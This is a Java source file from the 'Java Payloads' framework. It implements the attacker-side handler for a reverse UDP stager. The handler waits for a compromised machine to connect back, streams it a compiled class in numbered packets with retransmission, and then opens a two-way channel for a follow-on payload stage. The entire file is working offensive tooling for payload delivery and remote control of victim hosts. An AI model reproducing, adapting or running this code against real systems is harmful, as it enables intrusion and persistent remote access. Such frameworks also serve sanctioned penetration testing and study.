/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.handler.stager;

import java.io.InputStream;
import java.io.InterruptedIOException;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.io.PrintStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.List;

import javapayload.Parameter;
import javapayload.handler.stage.StageHandler;

public class ReverseUDP extends StagerHandler {

	public ReverseUDP() {
		super("Connect to a UDP port", true, true, "Connect to a UDP port on the attacker's machine.");
	};
	
	public Parameter[] getParameters() {
		return new Parameter[] {
				new Parameter("LHOST", false, Parameter.TYPE_HOST, "Local host to connect to"),
				new Parameter("LPORT", false, Parameter.TYPE_PORT_HASH, "Local port to connect to, or # to auto-bind.")
		};
	}

	private DatagramSocket socket = null;
	
	protected void handle(StageHandler stageHandler, String[] parameters, PrintStream errorStream, Object extraArg, StagerHandler readyHandler) throws Exception {
		if (socket == null) {
			socket = new DatagramSocket(Integer.parseInt(parameters[2]));
		}
		if (readyHandler != null) readyHandler.notifyReady();
		DatagramPacket dp = new DatagramPacket(new byte[512], 512);
		socket.receive(dp);
		handle(stageHandler, parameters, socket, dp.getAddress(), dp.getPort());
	}
		
	protected static void handle(StageHandler stageHandler, String[] parameters, DatagramSocket socket, InetAddress remoteAddress, int remotePort) throws Exception {
		InputStream classIn = ReverseUDP.class.getResourceAsStream("BidirectionalUDPStream.class");
		List/*<byte[]>*/ packetsList = new ArrayList();
		for (int i = 0; ; i++) {
			byte[] data = new byte[503];
			data[0] = -1;
			data[1] = (byte)(i >> 8);
			data[2] = (byte)i;
			int len = classIn.read(data, 3, 500);
			if (len < 500) {
				if (len == -1) len = 0;
				byte[] orig = data;
				data = new byte[len+3];
				System.arraycopy(orig, 0, data, 0, data.length);
				packetsList.add(data);
				if (classIn.read() != -1) 
					throw new RuntimeException("Not at EOF");
				if (len == 0) break;
			} else {
				packetsList.add(data);
			}
		}
		classIn.close();
		byte[][] packets = (byte[][]) packetsList.toArray(new byte[packetsList.size()][]);
		int start = 0;
		socket.setSoTimeout(500);
		while (true) {
			for (int i = start; i < packets.length; i++) {
				socket.send(new DatagramPacket(packets[i], packets[i].length, remoteAddress, remotePort));
			}
			byte[] buffer = new byte[5];
			DatagramPacket dp = new DatagramPacket(buffer, 5);
			while (true) {
				try {
					socket.receive(dp);
				} catch (InterruptedIOException ex) {
					start = packets.length-1;
					break;
				}
				if (buffer[0] != -1)
					continue;
				if (dp.getLength() == 3) {
					start = ((buffer[1] & 0xff) <<8) | (buffer[2] & 0xff);
				} else if (dp.getLength() != 1) {
					continue;
				}
				break;
			}
			if (dp.getLength() == 1)
				break;
		}
		socket.setSoTimeout(0);
		PipedInputStream in = new PipedInputStream();
		PipedOutputStream pipedOut = new PipedOutputStream(in);
		BidirectionalUDPStream bus = new BidirectionalUDPStream(pipedOut, socket, remoteAddress, remotePort);		
		stageHandler.handle(bus, in, parameters);
		bus.waitFinished();
	}

	protected boolean prepare(String[] parametersToPrepare) throws Exception {
		if (parametersToPrepare[2].equals("#")) {
			socket = new DatagramSocket();
			parametersToPrepare[2] = ""+socket.getLocalPort();	
			return true;
		}
		return false;
	}

	protected boolean needHandleBeforeStart() {
		return true;
	}
	
	protected String getTestArguments() {
		return "localhost #";
	}
}
